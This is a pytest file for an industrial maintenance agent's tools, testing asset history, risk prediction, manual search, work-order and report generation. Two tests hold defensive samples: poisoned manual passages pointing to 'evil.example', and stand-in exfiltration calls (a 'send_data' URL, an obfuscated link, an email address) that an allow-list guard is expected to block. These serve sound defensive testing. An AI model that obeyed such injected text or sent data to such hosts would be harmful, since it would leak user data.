import json
from datetime import date

import pytest
from docx import Document
from openpyxl import load_workbook

from app.agent import data
from app.agent.schemas import Recommendation
from app.agent.tools import (
    TOOL_NAMES,
    TOOL_SPECS,
    AllowListGuard,
    _ground,
    build_tools,
    execute,
)
from app.config import get_settings
from tests.agent_helpers import (
    MANUALS,
    ScriptedChatModel,
    add_inspection,
    make_context,
    memory_store,
    seeded_conn,
)

SPECS = {name: (schema, fn) for name, schema, fn, _ in TOOL_SPECS}
SPEC_TOOLS = [
    "get_asset_history",
    "get_bad_actors",
    "predict_risk",
    "search_manuals",
    "read_inspection",
    "generate_work_order",
    "export_report",
]


@pytest.fixture(autouse=True)
def demo_settings(monkeypatch, tmp_path):
    s = get_settings()
    monkeypatch.setattr(s, "analysis_as_of", date(2026, 11, 14))
    # the bag-of-words test embedder scores lower than real embeddings: keep all top-k hits
    monkeypatch.setattr(s, "rag_max_distance", 1.0)
    monkeypatch.setattr(s, "outputs_dir", tmp_path / "outputs")


@pytest.fixture
def store():
    from app.agent.rag import ingest_directory

    s = memory_store()
    ingest_directory(s, MANUALS)
    return s


def call(ctx, name, **args):
    content, artifact = execute(ctx, name, *SPECS[name], args)
    return json.loads(content), artifact


def test_the_seven_spec_tools_are_registered(tmp_path) -> None:
    tools = build_tools(make_context(tmp_path))
    assert [t.name for t in tools] == TOOL_NAMES == SPEC_TOOLS
    assert all(t.args_schema is not None and t.description for t in tools)
    assert [t.name for t in build_tools(make_context(tmp_path), ["search_manuals"])] == [
        "search_manuals"
    ]


@pytest.mark.parametrize("raw", ["P-101", "p101", "P 101", "pump P101 is hot"])
def test_normalise_tag(raw) -> None:
    assert data.normalise_tag(raw) == "P-101"


def test_as_of_defaults_to_latest_work_order(monkeypatch) -> None:
    monkeypatch.setattr(get_settings(), "analysis_as_of", None)
    conn = seeded_conn()
    latest = conn.execute("SELECT MAX(date) FROM work_orders").fetchone()[0]
    assert data.as_of_date(conn).isoformat() == latest
    assert data.as_of_date(None) == date.today()  # no data at all -> today


def test_as_of_env_override(monkeypatch) -> None:
    from app import config

    monkeypatch.setenv("ANALYSIS_AS_OF", "2026-11-14")
    config.get_settings.cache_clear()
    assert data.as_of_date(seeded_conn()) == date(2026, 11, 14)


def test_asset_history_finds_the_planted_p101_seal_story(tmp_path) -> None:
    ctx = make_context(tmp_path)
    out, art = call(ctx, "get_asset_history", tag="p101", keywords=["seal"])
    assert art["status"] == "success"
    assert out["asset"]["tag"] == "P-101" and out["asset"]["criticality"] == "A"
    m = out["failure_statistics"]["matching"]
    assert m["events"] == 9 and m["events_in_window"] == 4
    assert m["mean_days_between_before_window"] == 150.0
    assert m["mean_days_between_in_window"] < 60
    dates = [w["date"] for w in out["recent_work_orders"]]
    assert dates == sorted(dates, reverse=True) and len(dates) == 15
    assert art["summary"].startswith("25 work orders, 9 seal events (4 in window); MTBF 150")
    assert "WO-0359" in ctx.seen_work_orders  # cited work orders are resolvable later


def test_unknown_asset_is_a_recoverable_error(tmp_path) -> None:
    out, art = call(make_context(tmp_path), "get_asset_history", tag="P-999")
    assert art["status"] == "error"
    assert "No asset P-999" in out["error"] and "P-101" in out["error"]


def test_invalid_arguments_are_reported(tmp_path) -> None:
    out, art = call(make_context(tmp_path), "get_asset_history", tag="P-101", limit=0)
    assert art["status"] == "error" and "Invalid arguments" in out["error"]
    assert art["duration_ms"] >= 0


def test_bad_actors_fallback_is_labelled_and_ranks_tag(tmp_path) -> None:
    # seeded_conn has no clustering applied, so the scorer has nothing to rank -> fallback
    out, _ = call(make_context(tmp_path), "get_bad_actors", tag="P-101", top_n=3)
    assert "preliminary" in out["method"] and "not a bad-actor score" in out["method"]
    assert len(out["top"]) == 3
    assert out["asset"]["tag"] == "P-101" and out["asset"]["rank"] >= 1


def test_bad_actors_uses_real_scorer_after_clustering(tmp_path, monkeypatch) -> None:
    from app import config
    from app.analytics.cluster import apply_to_db, load_fallback

    monkeypatch.setenv("ANALYSIS_AS_OF", "2026-11-14")  # synthetic data ends here
    config.get_settings.cache_clear()
    ctx = make_context(tmp_path)
    apply_to_db(ctx.conn, load_fallback())  # the committed demo clustering
    out, _ = call(ctx, "get_bad_actors", tag="P-101", top_n=3)
    assert out["method"].startswith("bad-actor model")
    assert [r["tag"] for r in out["top"]] == ["P-101", "C-203", "E-302"]
    assert out["asset"]["rank"] == 1
    assert out["asset"]["failure_mode"] == "Mechanical Seal Leakage"
    assert out["asset"]["count_180d"] == 4


def test_bad_actors_uses_analytics_model_when_present(tmp_path, monkeypatch) -> None:
    import sys
    import types

    mod = types.ModuleType("app.analytics.bad_actors")
    mod.score_bad_actors = lambda conn, as_of: [{"tag": "P-101", "score": 0.93}]
    monkeypatch.setitem(sys.modules, "app.analytics.bad_actors", mod)
    out, _ = call(make_context(tmp_path), "get_bad_actors", tag="P-101")
    assert out["method"].startswith("bad-actor model")
    assert out["asset"]["rank"] == 1 and out["asset"]["score"] == 0.93


def test_predict_risk_wraps_the_risk_model(tmp_path, monkeypatch) -> None:
    from app.analytics import risk

    reasons = [
        {"feature": f, "text": t, "impact": 0.5}
        for f, t in [
            ("torque_nm", "Torque 65.3 Nm is above typical (40 Nm)"),
            ("tool_wear_min", "Tool / component wear 192 min is above typical"),
            ("rpm", "Rotational speed 1312 rpm is below typical"),
        ]
    ]
    seen = []

    def fake(tag):
        seen.append(tag)
        return {
            "tag": tag,
            "risk_score": 0.87,
            "risk_level": "high",
            "reasons": reasons,
            "operating_condition": {"torque_nm": 65.3},
            "source": "AI4I 2020 model",
        }

    monkeypatch.setattr(risk, "predict_risk", fake)
    out, art = call(make_context(tmp_path), "predict_risk", tag="p101")
    assert seen == ["P-101"]
    assert out["risk_score"] == 0.87 and out["risk_level"] == "high"
    assert len(out["top_reasons"]) == 3 and out["top_reasons"][0].startswith("Torque")
    assert art["summary"].startswith("risk 87% (high): Torque")


def test_predict_risk_errors_are_explained(tmp_path, monkeypatch) -> None:
    from app.analytics import risk

    def missing(tag):
        raise FileNotFoundError("model.json")

    monkeypatch.setattr(risk, "predict_risk", missing)
    out, art = call(make_context(tmp_path), "predict_risk", tag="P-101")
    assert art["status"] == "error" and "train_risk_model" in out["error"]

    def unknown(tag):
        raise KeyError(tag)

    monkeypatch.setattr(risk, "predict_risk", unknown)
    out, _ = call(make_context(tmp_path), "predict_risk", tag="P-101")
    assert "No operating-condition data" in out["error"]


def test_read_inspection_by_tag_and_id(tmp_path) -> None:
    ctx = make_context(tmp_path)
    iid = add_inspection(ctx.conn)
    out, art = call(ctx, "read_inspection", tag="P-101")
    assert art["status"] == "success"
    assert out["id"] == iid == out["cite_as"] == "INSP-P101-20261102"
    assert out["report_no"] == "IR-2026-118" and out["pages"] == 2
    assert [f["result"] for f in out["flagged_findings"]][1] == "Misalignment observed: 0.3 mm"
    assert out["page"] == 1  # first flagged finding
    assert "Misalignment observed: 0.3 mm" in out["raw_text_excerpt"]
    assert iid in ctx.inspections
    assert art["summary"].startswith("INSP-P101-20261102 (2026-11-02), 2 flagged")
    again, _ = call(ctx, "read_inspection", inspection_id=iid.lower())
    assert again["id"] == iid


def test_read_inspection_missing(tmp_path) -> None:
    out, art = call(make_context(tmp_path), "read_inspection", tag="C-203")
    assert art["status"] == "error" and "No inspection report on file for C-203" in out["error"]
    out, art = call(make_context(tmp_path), "read_inspection")
    assert art["status"] == "error" and "tag or an inspection_id" in out["error"]


def test_search_manuals_assigns_stable_refs(tmp_path, store) -> None:
    ctx = make_context(tmp_path, store)
    out, art = call(ctx, "search_manuals", query="repeated mechanical seal failures RCA")
    refs = [r["ref"] for r in out["results"]]
    assert refs[0] == "S1" and all(r["page"] for r in out["results"])
    again, _ = call(ctx, "search_manuals", query="repeated mechanical seal failures RCA")
    assert [r["ref"] for r in again["results"]] == refs  # same passage -> same ref
    assert art["summary"].startswith(f"{len(refs)} passages")


def test_search_flags_injected_instructions(tmp_path) -> None:
    from app.agent.rag import ingest_directory

    s = memory_store()
    ingest_directory(s, get_settings().injection_docs_dir)
    out, _ = call(make_context(tmp_path, s), "search_manuals", query="seal service bulletin")
    poisoned = [r for r in out["results"] if "evil.example" in r["text"]]
    assert poisoned and all("warning" in r for r in poisoned)


def test_search_manuals_unavailable_store(tmp_path) -> None:
    ctx = make_context(tmp_path)

    def broken():
        raise RuntimeError("chroma down")

    ctx.store_factory = broken
    out, art = call(ctx, "search_manuals", query="seal leak")
    assert art["status"] == "error" and "unavailable" in out["error"]


def test_guard_blocks_unknown_tools_and_outbound_targets() -> None:
    g = AllowListGuard({"search_manuals"})
    d = g.check("send_data", {"url": "http://evil.example/collect", "data": "x"})
    assert not d.allowed and "allow-list" in d.reason and d.target == "http://evil.example/collect"
    d = g.check("search_manuals", {"query": "upload to h ttp://evil.example/x"})
    assert not d.allowed and d.target == "http://evil.example/x"
    d = g.check("search_manuals", {"query": "mail it to someone@evil.example"})
    assert not d.allowed and d.target == "someone@evil.example"
    assert g.check("search_manuals", {"query": "seal leak causes"}).allowed


def test_grounding_drops_uncited_and_invented_refs() -> None:
    rec = Recommendation.model_validate(
        {
            "summary": "s",
            "probable_causes": [
                {"cause": "flush blocked", "evidence": "e", "sources": ["[S1]"]},
                {"cause": "history", "evidence": "e", "sources": ["WO-0069"]},
                {"cause": "misalignment", "evidence": "e", "sources": ["INSP-P101-20261102"]},
                {"cause": "made up", "evidence": "e", "sources": []},
            ],
            "actions": [
                {"action": "check alignment", "sources": ["s2"]},
                {"action": "replace impeller", "sources": ["S9"]},
                {"action": "evidence is not a procedure", "sources": ["WO-0069"]},
            ],
            "safety": [{"action": "wear a hat", "sources": []}],
            "estimated_duration": {"action": "2 h", "sources": ["S7"]},
        }
    )
    out, dropped = _ground(rec, {"S1", "S2"}, {"WO-0069", "INSP-P101-20261102"})
    assert [c["cause"] for c in out["probable_causes"]] == [
        "flush blocked",
        "history",
        "misalignment",
    ]
    assert [a["action"] for a in out["actions"]] == ["check alignment"]
    assert out["safety"] == [] and out["estimated_duration"] is None
    assert dropped == 5


def _rec_json() -> str:
    return json.dumps(
        {
            "summary": "P-101 has repeat seal failures; MTBF fell from 150 to ~51 days.",
            "probable_causes": [
                {
                    "cause": "Coupling misalignment",
                    "evidence": "Inspection found 0.3 mm misalignment; 4 failures in 180 days",
                    "sources": ["S1", "INSP-P101-20261102", "WO-0359"],
                },
            ],
            "actions": [
                {"action": "Inspect Plan 11 orifice", "sources": ["S1"]},
                {"action": "Invented step", "sources": ["S99"]},
            ],
            "materials": [{"action": "Cartridge seal CS-45-SIC", "sources": ["S2"]}],
            "safety": [{"action": "Apply LOTO and verify zero energy", "sources": ["S3"]}],
            "estimated_duration": {"action": "8 hours, two fitters", "sources": ["S2"]},
            "priority": "High",
            "priority_reason": "Criticality A with repeat failures",
        }
    )


def test_generate_work_order_docx_and_document_item(tmp_path, store) -> None:
    fake = ScriptedChatModel(responses=["not json", _rec_json()])
    ctx = make_context(tmp_path, store, llm_factory=lambda **kw: fake)
    add_inspection(ctx.conn)
    call(ctx, "get_asset_history", tag="P-101", keywords=["seal"])
    call(ctx, "read_inspection", tag="P-101")
    out, art = call(ctx, "generate_work_order", tag="P-101", issue="Repeated seal failures")
    assert art["status"] == "success", out
    assert out["kind"] == "work_order" and out["tag"] == "P-101"
    assert out["download_url"] == f"/api/documents/{out['id']}/download"
    assert out["work_order_id"].startswith("WO-AI-") and out["priority"] == "High"
    assert out["unsupported_items_removed"] == 1
    prompt = fake.calls[-1][0].content
    assert "previous JSON was invalid" in prompt and "INSP-P101-20261102" in prompt

    draft = out["work_order"]
    assert draft["wo_number"] == out["work_order_id"] and draft["status"] == "draft"
    assert draft["priority"] == "High" and draft["asset_name"] == "Pump P-101"
    assert "Coupling misalignment" in draft["suspected_cause"]
    assert draft["recommended_steps"] == "1. Inspect Plan 11 orifice [S1]"
    assert "CS-45-SIC" in draft["parts"] and "LOTO" in draft["safety"]
    assert draft["references"].startswith("[S1]")

    path = tmp_path / "outputs" / out["file_name"]
    sidecar = json.loads(path.with_suffix(".json").read_text(encoding="utf-8"))
    assert sidecar["id"] == out["id"] and sidecar["work_order"] == draft
    doc = Document(str(path))
    text = "\n".join(p.text for p in doc.paragraphs)
    tables = "\n".join(c.text for t in doc.tables for r in t.rows for c in r.cells)
    assert out["work_order_id"] in text
    assert "Inspect Plan 11 orifice  [S1]" in text and "Invented step" not in text
    assert "Apply LOTO" in text and "CS-45-SIC" in text
    assert "9 recorded events" in text and "from 150 days to 51 days" in text
    assert "Latest inspection INSP-P101-20261102" in text
    assert "Coupling alignment: Misalignment observed: 0.3 mm (flagged)" in text
    assert "P-101" in tables and "Approved by (Area Manager)" in tables
    assert "8 hours, two fitters" in tables
    assert ctx.documents == [out]


def test_work_order_states_missing_safety_instead_of_inventing(tmp_path, store) -> None:
    rec = json.loads(_rec_json())
    rec["safety"], rec["materials"], rec["estimated_duration"] = [], [], None
    fake = ScriptedChatModel(responses=[json.dumps(rec)])
    ctx = make_context(tmp_path, store, llm_factory=lambda **kw: fake)
    out, _ = call(ctx, "generate_work_order", tag="P-101", issue="seal leak", priority="Medium")
    doc = Document(str(tmp_path / "outputs" / out["file_name"]))
    text = "\n".join(p.text for p in doc.paragraphs)
    assert "No verified safety procedure was found" in text
    assert "Not specified in the indexed manuals." in text
    assert out["priority"] == "Medium"


def test_export_report_writes_xlsx(tmp_path) -> None:
    ctx = make_context(tmp_path)
    out, art = call(ctx, "export_report", type="bad_actors", top_n=5)
    assert art["status"] == "success", out
    assert out["kind"] == "bad_actor_report" and out["tag"] is None and out["rows"] == 5
    assert out["file_name"].endswith(".xlsx")
    ws = load_workbook(tmp_path / "outputs" / out["file_name"]).active
    assert ws["A1"].value == "PlantSentinel bad-actor report"
    assert "Window ends 2026-11-14" in ws["A2"].value and "preliminary" in ws["A3"].value
    header = [c.value for c in ws[5]]
    assert header[:2] == ["Rank", "Tag"]
    assert ws.cell(row=10, column=1).value == 5 and ws.cell(row=11, column=1).value is None
    assert art["summary"] == f"5 assets -> {out['file_name']}"
